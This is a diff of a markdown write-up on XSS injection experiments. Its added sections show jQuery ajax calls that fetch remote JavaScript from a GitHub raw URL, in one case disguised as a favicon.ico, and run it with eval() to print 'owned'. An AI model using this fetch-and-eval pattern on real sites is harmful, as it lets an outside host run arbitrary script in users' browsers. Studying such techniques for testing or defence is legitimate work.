@@ -93,7 +93,7 @@ And we check we have this tag at the HEAD:
 
 But when executing injection we get the same result
 
-## Third try. Import as text
+## Third try. Import as text, execute with eval(). Works!
 
 The are a lot of restrictions about importing JavaScript code into current page. It seems that including some "Same-Origin" from the server would help us, but let's try another ways involving only client.
 
@@ -102,9 +102,6 @@ $.ajax({
     url:'https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js?' + new Date().getTime(),
     success: function (data){
         eval(data);
-      //parse your data here
-      //you can split into lines using data.split('\n') 
-      //an use regex functions to effectively parse it
     }
   });
 ```
@@ -117,3 +114,23 @@ owned
 
 This method works event wiouth creating the META tag!
 
+## Fourth try. Import as image, execute with eval(). Works!
+
+The are a lot of restrictions about importing JavaScript code into current page. It seems that including some "Same-Origin" from the server would help us, but let's try another ways involving only client.
+
+```javascript
+$.ajax({
+    url:'https://raw.githubusercontent.com/disier/xss-injection-test/main/favicon.ico?' + new Date().getTime(),
+    success: function (data){
+        eval(data);
+    }
+  });
+```
+
+in this case we get the console message:
+
+```
+owned
+```
+
+This method works event wiouth creating the META tag!
